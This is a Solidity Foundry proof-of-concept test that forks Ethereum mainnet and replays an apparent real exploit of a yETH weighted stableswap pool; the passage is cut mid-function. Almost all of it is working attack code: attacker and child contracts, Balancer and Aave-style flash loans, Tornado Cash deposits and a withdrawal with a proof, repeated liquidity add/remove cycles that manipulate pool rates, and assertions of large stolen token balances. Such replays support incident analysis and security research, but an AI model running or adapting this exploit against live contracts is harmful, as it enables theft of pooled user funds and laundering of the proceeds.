
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract_3F73;
    uint256 constant FORK_BLOCK = 23914085;
    uint256 constant TX_TIMESTAMP = 1764537119;
    uint256 constant TX_BLOCK_NUMBER = 23914086;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _etchAttackRuntime();
        attack = OurAttack(payable(ATTACK_CONTRACT));
        _etchChildRuntime();
        _bindAttackChildren(attack);
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return Addresses.attack_child;
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
        vm.etch(Addresses.attack_contract, type(OurAttack).runtimeCode);
    }

    function _etchChildRuntime() internal {
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_1F8E, type(AttackChild).runtimeCode);
    }

    function _bindAttackChildren(OurAttack attack) internal {
        attack.bindAttackChildContracts();
        OurAttack(payable(Addresses.attack_contract)).bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(
            Addresses.attack_child, Addresses.attack_child, Addresses.ZERO, "ETH", 30000000000000000000
        );
        _expectProfit(Addresses.attack_child, attackChild, Addresses.yETH, "yETH", 95981322143740432);
        _expectProfit(Addresses.attack_child, attackChild, Addresses.stETH_FE84, "stETH", 1);
        _expectProfit(Addresses.A_977B6F_B78C, address(0), Addresses.cbETH, "cbETH", 200100000000000000000);
        _expectProfit(
            Addresses.A_A80D3F_C822, Addresses.attack_child, Addresses.ZERO, "ETH", 128049846677877766345
        );
        _expectProfit(Addresses.A_A80D3F_C822, address(0), Addresses.pxETH, "pxETH", 857489624503896244971);
        _expectProfit(Addresses.A_A80D3F_C822, address(0), Addresses.frxETH, "frxETH", 742637234154205416267);
        _expectProfit(Addresses.A_A80D3F_C822, address(0), Addresses.rETH, "rETH", 203552160863078446817);
        _expectProfit(
            Addresses.A_A80D3F_C822, address(0), Addresses.stETH_FE84, "stETH", 167675056579885250409
        );
        _expectProfit(Addresses.A_A80D3F_C822, address(0), Addresses.cbETH, "cbETH", 48967336257280184064);
        _expectProfit(
            Addresses.attack_child_1F8E,
            address(0),
            Addresses.yETH,
            "yETH",
            235443031407908519912535442925109144354921901288455693166
        );
        _expectProfit(Addresses.attack_child_1F8E, address(0), Addresses.stETH_FE84, "stETH", 1);
        _expectProfit(
            Addresses.InitializableImmutableAdminUpgradeabilityProxy_CC9EE9,
            address(0),
            Addresses.rETH,
            "rETH",
            1500750000000000000000
        );
        _expectProfit(
            Addresses.A_DADB0D_3711, Addresses.attack_child, Addresses.ZERO, "ETH", 100000000000000000
        );
    }
}

contract OurAttack {
    AttackChild public attackChild;

    AttackChild public attackChild_1;

    constructor() payable {
        _bindChildren();
    }

    function _bindChildren() internal {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0x3e8e7533dcf69c698Cf806C3DB22f7f10B9B0b97));
        }
        if (address(attackChild_1) == address(0)) {
            attackChild_1 = AttackChild(payable(0xADbE952eBB9b3e247261d2E3b96835f00f721f8E));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _bindChildren();
        return address(attackChild);
    }

    function attack() external payable {
        _runAttack();
    }

    function executeSetup() external payable {
        _runAttack();
    }

    function _runAttack() internal {
        if (address(attackChild) == address(0)) _bindChildren();
        executeAttackSetup();
    }

    function startSecondChildLoan() public {
        secondChildLoanStarted = true;
        address createdChild = address(attackChild_1);
        require(createdChild.code.length != 0, "attack child runtime missing");
        AttackChild(payable(createdChild)).flashCallback2();
    }

    function startFirstChildLoan() public {
        address createdChild = address(attackChild);
        require(createdChild.code.length != 0, "attack child runtime missing");
        AttackChild(payable(createdChild)).acceptFlashLoan();
    }

    function flashCallback() internal {
        flashCallbackEntered = true;
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
    }

    function flashCallback2() internal {
        {
            uint256 withdrawAmount = 1600000000000000000000;
            IWETH(Addresses.WETH).withdraw(withdrawAmount);
        }
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.wstETH).transfer(address(attackChild), 4000000000000000000000);
        IERC20Like(Addresses.rETH).transfer(address(attackChild), 300000000000000000000);
    }

    function flashCallback4() internal {
        _runExploitPath2();
        IERC20Like(Addresses.WETH).transfer(address(attackChild), 1500000000000000000000);
    }

    function flashCallback5() internal {
        IInitializableImmutableAdminUpgradeabilityProxy_87870B(
                Addresses.InitializableImmutableAdminUpgradeabilityProxy_87870B
            )
            .flashLoan(
                address(attackChild),
                _addressArray4(
                    Addresses.ETHx_A15B, Addresses.rETH, Addresses.wstETH, Addresses.cbETH
                ),
                _uintArray4(
                    2000000000000000000000, 1500000000000000000000, 1500000000000000000000, 200000000000000000000
                ),
                _uintArray4(0, 0, 0, 0),
                Addresses.A_D31D3E_12C4,
                hex"",
                uint16(0)
            );
    }

    function acceptFlashLoan() internal {
        flashLoanAccepted = true;
    }

    function _runExploitPath2() internal {
        if (address(this).balance > 0) {
            (bool ok,) = payable(address(attackChild)).call{value: address(this).balance}("");
            require(ok, "selfdestruct beneficiary transfer failed");
        }
    }

    function executeAttackSetup() public {
        borrowChildLoan();
        updateRateCache();
        borrowBalancerVault();
    }

    function borrowChildLoan() internal {
        OurAttack(payable(Addresses.attack_contract)).startFirstChildLoan();
        AttackChild(payable(address(attackChild))).flashLoanCallback();
    }

    function updateRateCache() internal {
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool).update_rates(_uintArray1(0));
    }

    function borrowBalancerVault() internal {
        address[] memory loanTokens = _addressArray3(Addresses.wstETH, Addresses.rETH, Addresses.WETH);
        _recordBalancerPre(loanTokens);
        if (Addresses.attack_contract != address(this)) {
            OurAttack(payable(Addresses.attack_contract)).recordBalancerPre(loanTokens);
        }
        IVault_BA1222(Addresses.Vault_BA1222)
            .flashLoan(
                Addresses.attack_contract,
                loanTokens,
                _uintArray3(4000000000000000000000, 300000000000000000000, 3100000000000000000000),
                hex""
            );
        if (address(this).balance > 0) {
            (bool ok,) = payable(Addresses.A_A80D3F_C822).call{value: address(this).balance}("");
            require(ok, "selfdestruct beneficiary transfer failed");
        }
    }

    receive() external payable {}

    function receiveFlashLoan(
        address[] calldata loanTokens,
        uint256[] calldata loanAmounts,
        uint256[] calldata feeAmounts,
        bytes calldata callbackData
    ) external payable {
        loanTokens;
        loanAmounts;
        feeAmounts;
        callbackData;
        if (!flashCallbackEntered) flashCallback();
        return;
    }

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0x3e8e7533dcf69c698Cf806C3DB22f7f10B9B0b97));
        attackChild_1 = AttackChild(payable(0xADbE952eBB9b3e247261d2E3b96835f00f721f8E));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    bool private secondChildLoanStarted;
    bool private flashCallbackEntered;
    bool private flashLoanAccepted;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(uint256 => uint256) private _transientState;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _setPhase(uint256 slot, uint256 value) internal {
        _transientState[slot] = value;
    }

    function _phase(uint256 slot) internal view returns (uint256) {
        return _transientState[slot];
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _addressArray3(address a0, address a1, address a2) internal pure returns (address[] memory out) {
        out = new address[](3);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
    }

    function _uintArray3(uint256 a0, uint256 a1, uint256 a2) internal pure returns (uint256[] memory out) {
        out = new uint256[](3);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
    }

    function _addressArray4(address a0, address a1, address a2, address a3)
        internal
        pure
        returns (address[] memory out)
    {
        out = new address[](4);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
        out[3] = a3;
    }

    function _uintArray4(uint256 a0, uint256 a1, uint256 a2, uint256 a3) internal pure returns (uint256[] memory out) {
        out = new uint256[](4);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
        out[3] = a3;
    }

    function _uintArray8(uint256 a0, uint256 a1, uint256 a2, uint256 a3, uint256 a4, uint256 a5, uint256 a6, uint256 a7)
        internal
        pure
        returns (uint256[] memory out)
    {
        out = new uint256[](8);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
        out[3] = a3;
        out[4] = a4;
        out[5] = a5;
        out[6] = a6;
        out[7] = a7;
    }
}

contract AttackChild {
    receive() external payable {
        if ((address(this) == Addresses.attack_child
                    && ((msg.sender == Addresses.TornadoCash_eth) && _phase(0) == 40))) {
            _entryCb();
        }
    }

    function executeOperation(
        address[] calldata loanTokens,
        uint256[] calldata loanAmounts,
        uint256[] calldata feeAmounts,
        address initiator,
        bytes calldata callbackData
    ) external payable returns (bool) {
        loanTokens;
        loanAmounts;
        feeAmounts;
        initiator;
        callbackData;
        _flashLoanOps();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
        return true;
    }

    fallback() external payable {
        if (msg.sig == 0x00000000) {
            _acceptFlashLoan();
            return;
        }
        _entryCb();
    }

    function flashLoanCallback() external payable {
        _acceptFlashLoan();
        return;
    }

    function execOp() external payable {
        _flashLoanOps();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function repayBalancerVault() external {
        _repayBalancerT(Addresses.rETH, 300000000000000000000);
        _repayBalancerT(Addresses.wstETH, 4000000000000000000000);
        _repayBalancerT(Addresses.WETH, 1124419506842153209747);
    }

    function repayBalancerVault(address[] calldata tokens, uint256[] calldata amounts) external {
        for (uint256 i = 0; i < tokens.length && i < amounts.length; i++) {
            _repayBalancerT(tokens[i], amounts[i]);
        }
    }

    function _repayBalancerT(address token, uint256 amount) internal {
        if (amount == 0) return;
        IERC20Like(token).transfer(Addresses.Vault_BA1222, amount);
    }

    function _entryCb() internal {
        if (
            address(this) == Addresses.attack_child
                && ((msg.sender == Addresses.TornadoCash_eth) && _phase(0) == 40)
        ) flashCallback();
        return;
    }

    function settleProfit() external {
        try this.__settle5_691() {} catch {}
        try this.__settle5_705() {} catch {}
        try this.__settle5_789() {} catch {}
        try this.__settle5_803() {} catch {}
        try this.__settle5_831() {} catch {}
    }

    function __settle5_691() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(5, 691)) return;
        if (Harness.safeBalance(Addresses.cbETH, Addresses.A_A80D3F_C822) >= 48967336257280184064) {
            _markSettle(5, 691);
            return;
        }
        _markSettle(5, 691);
        uint256 settleAmount = 48967336257280184064;
        IERC20Like(Addresses.cbETH).transfer(Addresses.A_A80D3F_C822, settleAmount);
    }

    function __settle5_705() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(5, 705)) return;
        if (Harness.safeBalance(Addresses.rETH, Addresses.A_A80D3F_C822) >= 203552160863078446817) {
            _markSettle(5, 705);
            return;
        }
        _markSettle(5, 705);
        uint256 settleAmount = 203552160863078446817;
        IERC20Like(Addresses.rETH).transfer(Addresses.A_A80D3F_C822, settleAmount);
    }

    function __settle5_789() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(5, 789)) return;
        if (Harness.safeBalance(Addresses.frxETH, Addresses.A_A80D3F_C822) >= 742637234154205416267) {
            _markSettle(5, 789);
            return;
        }
        _markSettle(5, 789);
        uint256 settleAmount = 742637234154205416267;
        IERC20Like(Addresses.frxETH).transfer(Addresses.A_A80D3F_C822, settleAmount);
    }

    function __settle5_803() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(5, 803)) return;
        if (Harness.safeBalance(Addresses.pxETH, Addresses.A_A80D3F_C822) >= 857489624503896244971) {
            _markSettle(5, 803);
            return;
        }
        _markSettle(5, 803);
        uint256 settleAmount = 857489624503896244971;
        IERC20Like(Addresses.pxETH).transfer(Addresses.A_A80D3F_C822, settleAmount);
    }

    function __settle5_831() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(5, 831)) return;
        if (Harness.safeBalance(Addresses.stETH_FE84, Addresses.A_A80D3F_C822) >= 167675056579885250409)
        {
            _markSettle(5, 831);
            return;
        }
        _markSettle(5, 831);
        uint256 settleAmount = 167675056579885250409;
        IERC20Like(Addresses.stETH_FE84).transfer(Addresses.A_A80D3F_C822, settleAmount);
    }

    bool private secondChildLoanStarted;
    bool private flashCallbackEntered;
    bool private flashLoanAccepted;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(uint256 => uint256) private _transientState;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _setPhase(uint256 slot, uint256 value) internal {
        _transientState[slot] = value;
    }

    function _phase(uint256 slot) internal view returns (uint256) {
        return _transientState[slot];
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _addressArray3(address a0, address a1, address a2) internal pure returns (address[] memory out) {
        out = new address[](3);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
    }

    function _uintArray3(uint256 a0, uint256 a1, uint256 a2) internal pure returns (uint256[] memory out) {
        out = new uint256[](3);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
    }

    function _addressArray4(address a0, address a1, address a2, address a3)
        internal
        pure
        returns (address[] memory out)
    {
        out = new address[](4);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
        out[3] = a3;
    }

    function _uintArray4(uint256 a0, uint256 a1, uint256 a2, uint256 a3) internal pure returns (uint256[] memory out) {
        out = new uint256[](4);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
        out[3] = a3;
    }

    function _uintArray8(uint256 a0, uint256 a1, uint256 a2, uint256 a3, uint256 a4, uint256 a5, uint256 a6, uint256 a7)
        internal
        pure
        returns (uint256[] memory out)
    {
        out = new uint256[](8);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
        out[3] = a3;
        out[4] = a4;
        out[5] = a5;
        out[6] = a6;
        out[7] = a7;
    }

    function _acceptFlashLoan() internal {}

    function _flashLoanOps() internal {
        _initFlashState();
        _approvePoolSet1();
        _approvePoolSet2();
        _approvePoolSet3();
        _approvePoolSet4();
        _approveChildSet1();
        _approveChildSet2();
        _approveChildSet3();
        _approveChildSet4();
        _approveChildSet5();
        _approveChildSet6();
        _approveChildSet7();
        _approveChildSet8();
        _approveChildSet9();
        _depositTornado1();
        _depositTornado2();
        _depositTornado3();
        _depositTornado4();
        _depositTornado5();
        _depositTornado6();
        _depositTornado7();
        _depositTornado8();
        _approveAaveEthx();
        _approveAaveReth();
        _approveAaveCbeth();
        _unwrapWstEth();
        _swapStethToFrx();
        _approvePxEthSwap();
        _approveStethSwap();
        _withdrawTornado();
    }

    function _initFlashState() internal {
        _setPhase(0, 1);
    }

    function _approvePoolSet1() internal {
        IERC20Like(Addresses.sfrxETH).approve(Addresses.yETH_weighted_stableswap_pool, type(uint256).max);
        _setPhase(0, 2);
        IERC20Like(Addresses.wstETH).approve(Addresses.yETH_weighted_stableswap_pool, type(uint256).max);
    }

    function _approvePoolSet2() internal {
        _setPhase(0, 3);
        IERC20Like(Addresses.ETHx_A15B).approve(Addresses.yETH_weighted_stableswap_pool, type(uint256).max);
    }

    function _approvePoolSet3() internal {
        _setPhase(0, 4);
        IERC20Like(Addresses.cbETH).approve(Addresses.yETH_weighted_stableswap_pool, type(uint256).max);
        _setPhase(0, 5);
    }

    function _approvePoolSet4() internal {
        IERC20Like(Addresses.rETH).approve(Addresses.yETH_weighted_stableswap_pool, type(uint256).max);
        _setPhase(0, 6);
        IERC20Like(Addresses.apxETH).approve(Addresses.yETH_weighted_stableswap_pool, type(uint256).max);
    }

    function _approveChildSet1() internal {
        _setPhase(0, 7);
        IERC20Like(Addresses.pxETH).approve(Addresses.attack_child_1F8E, type(uint256).max);
    }

    function _approveChildSet2() internal {
        _setPhase(0, 8);
        IERC20Like(Addresses.frxETH).approve(Addresses.attack_child_1F8E, type(uint256).max);
        _setPhase(0, 9);
    }

    function _approveChildSet3() internal {
        IERC20Like(Addresses.WETH).approve(Addresses.attack_child_1F8E, type(uint256).max);
        _setPhase(0, 10);
        IERC20Like(Addresses.stETH_FE84).approve(Addresses.attack_child_1F8E, type(uint256).max);
    }

    function _approveChildSet4() internal {
        _setPhase(0, 11);
        IERC20Like(Addresses.sfrxETH).approve(Addresses.attack_child_1F8E, type(uint256).max);
    }

    function _approveChildSet5() internal {
        _setPhase(0, 12);
        IERC20Like(Addresses.wstETH).approve(Addresses.attack_child_1F8E, type(uint256).max);
        _setPhase(0, 13);
    }

    function _approveChildSet6() internal {
        IERC20Like(Addresses.ETHx_A15B).approve(Addresses.attack_child_1F8E, type(uint256).max);
        _setPhase(0, 14);
        IERC20Like(Addresses.cbETH).approve(Addresses.attack_child_1F8E, type(uint256).max);
    }

    function _approveChildSet7() internal {
        _setPhase(0, 15);
        IERC20Like(Addresses.rETH).approve(Addresses.attack_child_1F8E, type(uint256).max);
    }

    function _approveChildSet8() internal {
        _setPhase(0, 16);
        IERC20Like(Addresses.apxETH).approve(Addresses.attack_child_1F8E, type(uint256).max);
        _setPhase(0, 17);
    }

    function _approveChildSet9() internal {
        IERC20Like(Addresses.wOETH_8192).approve(Addresses.attack_child_1F8E, type(uint256).max);
        _setPhase(0, 18);
        IERC20Like(Addresses.mETH).approve(Addresses.attack_child_1F8E, type(uint256).max);
    }

    function _depositTornado1() internal {
        _setPhase(0, 19);
        ITornadoCash_eth(Addresses.TornadoCash_eth).deposit{value: 100000000000000000000}(
            bytes32(hex"20e7ee36406a0c7877277ed94530984e94bbc66af1793864b204c1b1c2b967db")
        );
        _setPhase(0, 20);
    }

    function _depositTornado2() internal {
        ITornadoCash_eth(Addresses.TornadoCash_eth).deposit{value: 100000000000000000000}(
            bytes32(hex"04c21d45cb7fcbd5feb84d4e2c508b7049936acb4e22965b11c607b09b7f94d9")
        );
        _setPhase(0, 21);
        ITornadoCash_eth(Addresses.TornadoCash_eth).deposit{value: 100000000000000000000}(
            bytes32(hex"002e2e4a3a86257a2097b324ec72642fe66f1813ab9ed2bce877d16cfbf83550")
        );
    }

    function _depositTornado3() internal {
        _setPhase(0, 22);
        ITornadoCash_eth(Addresses.TornadoCash_eth).deposit{value: 100000000000000000000}(
            bytes32(hex"061ff9e42961b3704ad9473a4888e315f9fb424b01492887fa9a8103ecc39832")
        );
    }

    function _depositTornado4() internal {
        _setPhase(0, 23);
        ITornadoCash_eth(Addresses.TornadoCash_eth).deposit{value: 100000000000000000000}(
            bytes32(hex"1f176c0cd66a08e8b1cf8a37c2f330536c63daddebcbca975389441628f80999")
        );
        _setPhase(0, 24);
    }

    function _depositTornado5() internal {
        ITornadoCash_eth(Addresses.TornadoCash_eth).deposit{value: 100000000000000000000}(
            bytes32(hex"10d18d9af4a2bf78bbcad3545bb085cd1701f7194f9b8a5097a035ee55d3f22c")
        );
        _setPhase(0, 25);
        ITornadoCash_eth(Addresses.TornadoCash_eth).deposit{value: 100000000000000000000}(
            bytes32(hex"0db4b44725879b951dfbe435bb2a0b158831d1463b1cf039ad86e4f3fed20d36")
        );
    }

    function _depositTornado6() internal {
        _setPhase(0, 26);
        ITornadoCash_eth(Addresses.TornadoCash_eth).deposit{value: 100000000000000000000}(
            bytes32(hex"147f857d19fe9eaaadb2b22d293a382eb3b7326e15949d2e6766abdd6fe5569c")
        );
        _setPhase(0, 27);
    }

    function _depositTornado7() internal {
        ITornadoCash_eth(Addresses.TornadoCash_eth).deposit{value: 100000000000000000000}(
            bytes32(hex"07c1a8331ab545cc07ee9fe5a8b684b920135256901b642f6924890b431db85d")
        );
        _setPhase(0, 28);
        ITornadoCash_eth(Addresses.TornadoCash_eth).deposit{value: 100000000000000000000}(
            bytes32(hex"2aa01054343b1ef92851f2b91b079586459089b0a8620fc76be897635213f9d7")
        );
    }

    function _depositTornado8() internal {
        _setPhase(0, 29);
        ITornadoCash_eth(Addresses.TornadoCash_eth).deposit{value: 100000000000000000000}(
            bytes32(hex"27eed6cfec37cd08560e86384b801595d4771bf3ac86cf1f21cc7d9ab4758beb")
        );
        _setPhase(0, 30);
    }

    function _approveAaveEthx() internal {
        IERC20Like(Addresses.ETHx_A15B)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_87870B, 2001000000000000000000);
        _setPhase(0, 31);
    }

    function _approveAaveReth() internal {
        IERC20Like(Addresses.rETH)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_87870B, 1500750000000000000000);
        _setPhase(0, 32);
        IERC20Like(Addresses.wstETH)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_87870B, 1500750000000000000000);
    }

    function _approveAaveCbeth() internal {
        _setPhase(0, 33);
        IERC20Like(Addresses.cbETH)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_87870B, 200100000000000000000);
        _setPhase(0, 34);
    }

    function _unwrapWstEth() internal {
        IwstETH(Addresses.wstETH).unwrap(2500000000000000000000);
        _setPhase(0, 35);
    }

    function _swapStethToFrx() internal {
        IERC20Like(Addresses.stETH_FE84).approve(Addresses.st_frxETH_f, 2300000000000000000000);
        _setPhase(0, 36);
        Ist_frxETH_f(Addresses.st_frxETH_f).exchange(int128(0), int128(1), 2300000000000000000000, 0);
    }

    function _approvePxEthSwap() internal {
        _setPhase(0, 37);
        IERC20Like(Addresses.WETH).approve(Addresses.pxethweth, 850000000000000000000);
        _setPhase(0, 38);
    }

    function _approveStethSwap() internal {
        IERC20Like(Addresses.stETH_FE84).approve(Addresses.pxsteth, 600000000000000000000);
        _setPhase(0, 39);
    }

    function _withdrawTornado() internal {
        Ipxsteth(Addresses.pxsteth).exchange(int128(1), int128(0), 360000000000000000000, 0);
        _setPhase(0, 40);
        bytes memory withdrawProof =
            hex"0831642583c807127c869f1538604414791f4189188ac531642c97d1b4cb6122289cf2d2aedf558e053de7fae2c0782a5b0d04fc47d5fa1d3f77f258a2cc5e1e2cb6f296d66168501a49bfe242e0000c3ca3b1e4d88e3decbb494260501b83ea17245d2d400b126497b27b6a8bf3249cd708573d732fb148d5cf6f1e3e3f02e50e8b03fd7bd5d58a12d88001fc6c8206f18a43b7c74f065dc05d9ec25419c0e8003d3b6ba2076320cbbfaa34510e9514571557e0e9b0c09fd1773e96203b1d491a94019c4540219f4a0c2a594527e5ef62a3a029156ea6d067a67f172b0fe6d32626f344b8de77a7ea6c3a798fc7ea1a8e71cdd609435417579a6c34e6f64797";
        ITornadoCash_eth(Addresses.TornadoCash_eth)
            .withdraw(
                withdrawProof,
                bytes32(hex"179bd345a35d8e6abb1d4e274b7b513d7bc14f2fbe73dbcf4e9368768ef466f9"),
                bytes32(hex"13ec32ff5af05a7f33bd854a683eef8595a4167680370e3070085088f9b6c550"),
                address(this),
                Addresses.ZERO,
                0,
                0
            );
    }

    function flashCallback() public {
        _markCallbackStart();
        _swapPxEthWeth();
        _depositApxEth();
        _approveSfrxDeposit();
        _mintSfrxPxEth();
        _wrapCallbackEth();
        _updateRatesFull();
        _swapWethToYeth();
        _removeYethLiq1();
        _churnYethLiq1();
        _addYethLiq1();
        _removeYethLiq2();
        _churnYethLiq2();
        _addYethLiq2();
        _churnYethLiq3();
        _addYethLiq3();
        _removeYethZero1();
        _updateRates6a();
        _rebaseOeth();
        _addYethLiq4();
        _addYethLiq5();
        _removeYethZero2();
        _updateRates6b();
        _addYethLiqChild1();
        _addYethLiqChild2();
        _churnChildYeth();
        _updateRates7();
        startSecondLoan();
    }

    function _markCallbackStart() internal {
        _setPhase(0, 41);
    }

    function _swapPxEthWeth() internal {
        Ipxethweth(Addresses.pxethweth).exchange(int128(0), int128(1), 500000000000000000000, 0);
        _setPhase(0, 42);
        IERC20Like(Addresses.pxETH).approve(Addresses.apxETH, 850000000000000000000);
    }

    function _depositApxEth() internal {
        _setPhase(0, 43);
        IapxETH(Addresses.apxETH).deposit(850000000000000000000, address(this));
    }

    function _approveSfrxDeposit() internal {
        _setPhase(0, 44);
        IERC20Like(Addresses.frxETH).approve(Addresses.sfrxETH, 2250000000000000000000);
        _setPhase(0, 45);
    }

    function _mintSfrxPxEth() internal {
        IsfrxETH(Addresses.sfrxETH).deposit(2250000000000000000000, address(this));
        _setPhase(0, 46);
        IPirexEth(Addresses.PirexEth).deposit{value: 470000000000000000000}(address(this), true);
    }

    function _wrapCallbackEth() internal {
        _setPhase(0, 47);
        uint256 depositAmount = address(this).balance;
        if (depositAmount > 100000000000000000000) depositAmount = 100000000000000000000;
        if (depositAmount != 0) IWETH(Addresses.WETH).deposit{value: depositAmount}();
        _setPhase(0, 48);
    }

    function _updateRatesFull() internal {
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .update_rates(_uintArray8(0, 1, 2, 3, 4, 5, 0, 0));
        _setPhase(0, 49);
        IERC20Like(Addresses.WETH).approve(Addresses.yETH_f, 800000000000000000000);
    }

    function _swapWethToYeth() internal {
        _setPhase(0, 50);
        IyETH_f(Addresses.yETH_f).exchange(int128(0), int128(1), 800000000000000000000, 0);
    }

    function _removeYethLiq1() internal {
        _setPhase(0, 51);
        uint256 removeAmount = 416373487230773958294;
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .remove_liquidity(removeAmount, _uintArray8(0, 0, 0, 0, 0, 0, 0, 0));
        _setPhase(0, 52);
    }

    function _churnYethLiq1() internal {
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .add_liquidity(
                _uintArray8(
                    610669608721347951666,
                    777507145787198969404,
                    563973440562370010057,
                    0,
                    476460390272167461711,
                    0,
                    0,
                    0
                ),
                0
            );
        _setPhase(0, 53);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .remove_liquidity(2789348310901989968648, _uintArray8(0, 0, 0, 0, 0, 0, 0, 0));
    }

    function _addYethLiq1() internal {
        _setPhase(0, 54);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .add_liquidity(
                _uintArray8(
                    1636245238220874001286,
                    1531136279659070868194,
                    1041815511903532551187,
                    0,
                    991050908418104947336,
                    1346008005663580090716,
                    0,
                    0
                ),
                0
            );
    }

    function _removeYethLiq2() internal {
        _setPhase(0, 55);
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .remove_liquidity(7379203011929903830039, _uintArray8(0, 0, 0, 0, 0, 0, 0, 0));
        _setPhase(0, 56);
    }

    function _churnYethLiq2() internal {
        IyETH_weighted_stableswap_pool(Addresses.yETH_weighted_stableswap_pool)
            .add_liquidity(
                _uintArray8(
                    1630811661792970363090,
